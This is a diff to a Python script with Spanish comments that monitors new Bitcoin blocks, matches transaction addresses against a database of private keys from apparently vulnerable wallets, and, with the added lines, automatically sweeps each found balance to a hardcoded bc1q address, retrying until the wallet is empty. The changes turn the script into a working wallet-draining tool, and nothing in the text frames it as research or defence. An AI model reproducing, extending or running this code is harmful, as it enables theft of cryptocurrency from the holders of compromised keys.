@@ -2,7 +2,6 @@ import os
 import hashlib
 import requests
 import json
-import sqlite3
 from requests.auth import HTTPBasicAuth
 
 import time
@@ -56,52 +55,6 @@ def buscar_wifMongoDB(address):
         return None
 
 
-
-# Función para obtener todas las addresses
-def obtener_todas_las_addresses():
-    # Conectar a la base de datos local
-    conn = sqlite3.connect('datos.db')
-    cursor = conn.cursor()
-    
-    # Obtener todas las addresses de la tabla
-    cursor.execute('''
-    SELECT address FROM datos
-    ''')
-    resultados = cursor.fetchall()
-    
-    # Cerrar la conexión
-    conn.close()
-    
-    # Convertir el resultado en un array de addresses
-    addresses = [resultado[0] for resultado in resultados]
-    return addresses
-
-
-# Función para buscar el wif por address
-def buscar_wif_por_address(address):
-    # Conectar a la base de datos local
-    conn = sqlite3.connect('vulnerableWalletBTC.db')
-    cursor = conn.cursor()
-    
-    # Buscar el wif correspondiente al address
-    cursor.execute('''
-    SELECT wif FROM datos WHERE address = ?
-    ''', (address,))
-    resultado = cursor.fetchone()
-    
-    # Cerrar la conexión
-    conn.close()
-    
-    # Retornar el wif si se encuentra, de lo contrario, retornar None
-    return resultado[0] if resultado else None
-
-
-
-def guardar_texto_en_archivo(texto, nombre_archivo):
-    with open(nombre_archivo, 'a') as archivo:
-        archivo.write(texto + '\n')
-
-
 # Obtener Numero del Bloque
 def get_latest_block_number():
     data = {
@@ -117,6 +70,7 @@ def get_latest_block_number():
         return result
     except requests.exceptions.RequestException as e:
         return False
+
 
 
 # Obtener Informacion del Bloque por el hash pasando el numero
@@ -202,6 +156,7 @@ def get_transaction_addresses(txid=None):
         return []
 
 
+
 # Función para enviar todos los fondos
 def send_all_funds(privateKeyWIF, destination_address):
     # Crear una clave a partir de la clave privada en formato WIF
@@ -220,11 +175,10 @@ def send_all_funds(privateKeyWIF, destination_address):
             print("Error: El saldo no es un número válido.")
             return
 
-
+        # Si no hay saldo, salimos del bucle
         if balance <= 0:
-            print("No hay fondos disponibles para enviar")
+            print("No hay fondos disponibles para enviar.")
             break  # Sale del bucle while si se cumple la condición
-
 
         try:
             # Crear la transacción con la tarifa configurada
@@ -233,56 +187,22 @@ def send_all_funds(privateKeyWIF, destination_address):
             # Verificar que la transacción fue exitosa
             if tx:
                 print(f"Transacción creada con éxito: {tx}")
+                # Confirmamos que el saldo ha cambiado y no hay fondos disponibles
+                balance = key.get_balance('btc')  # Actualizamos el saldo
+                print(f"Saldo actualizado: {balance} BTC")
             else:
                 print("No se pudo crear la transacción, sin detalles de la respuesta.")
 
         except Exception as e:
             print(f"Error al crear la transacción: {str(e)}")
-
-
-        # Esperar 10 segundos antes de intentar nuevamente hasta que quede en 0 BTC
-        time.sleep(10)
-
-
-
-# Función para obtener el balance de una dirección usando la API de Blockchain.info
-def obtener_balance_direccion(direcciones):
-    """
-    Obtiene el balance de varias direcciones usando la API de Blockchain.info.
-    Las direcciones se pasan en lotes de 140 debido a las limitaciones de la API.
-
-    :param direcciones: Lista de direcciones Bitcoin.
-    :return: Diccionario con los balances de las direcciones.
-    """
-    # Asegúrate de que 'direcciones' es una lista
-    if isinstance(direcciones, str):
-        direcciones = direcciones.split(',')  # Convertir cadena separada por comas en lista
-
-
-    # Agrupar direcciones en bloques de 140 para evitar superar los límites de la API
-    balances = {}
-    for i in range(0, len(direcciones), 140):
-        batch = direcciones[i:i+140]
-
-        # Unir las direcciones con '|' para la URL
-        direcciones_unidas = '|'.join(batch)
         
-        url = f"https://blockchain.info/balance?active={direcciones_unidas}"
-        response = requests.get(url)
-        
-        if response.status_code == 200:
-            data = response.json()
+        # Si el saldo se actualizó y se volvió cero, detenemos el bucle
+        if balance <= 0:
+            print("Se han enviado todos los fondos disponibles.")
+            break  # Sale del bucle while si el saldo es 0
 
-            balances.update(data)
-        else:
-            print(f"Error al obtener el balance para las direcciones: {direcciones_unidas}")
-            print(f"Respuesta de la API: {response.text}")
-        
-
-        # Esperar 5 segundos antes de procesar el siguiente lote
-        time.sleep(5)
-    
-    return balances
+        # Esperar 2 segundos antes de intentar nuevamente hasta que quede en 0 BTC
+        time.sleep(2)
 
 
 
@@ -353,9 +273,12 @@ def procesar_bloque_y_transacciones(bloque_id):
                     wifSinComprimir = resultado['wif_sin_comprimir']
 
                     # Buscar en MongoDB, si existe retiramos saldo
-                    searchMongoDBWIF = buscar_wifMongoDB(direccionSinComprimir)
-                    if searchMongoDBWIF:
-                        print(f"[Nueva Transaccion] {direccionComprimir} :: {searchMongoDBWIF}")
+                    searchMongoDBWIFSINComprimir = buscar_wifMongoDB(direccionSinComprimir)
+                    if searchMongoDBWIFSINComprimir:
+                        print(f"[Nueva Transaccion] {direccionComprimir} :: {searchMongoDBWIFSINComprimir}")
+
+                        # Realizar Retiro
+                        send_all_funds(searchMongoDBWIFSINComprimir, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
 
 
                 if resultado['direccion_comprimida'].startswith('1'):
@@ -367,6 +290,8 @@ def procesar_bloque_y_transacciones(bloque_id):
                     if searchMongoDBWIF:
                         print(f"[Nueva Transaccion] {direccionComprimir} :: {searchMongoDBWIF}")
 
+                        # Realizar Retiro
+                        send_all_funds(searchMongoDBWIF, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
 
 
 
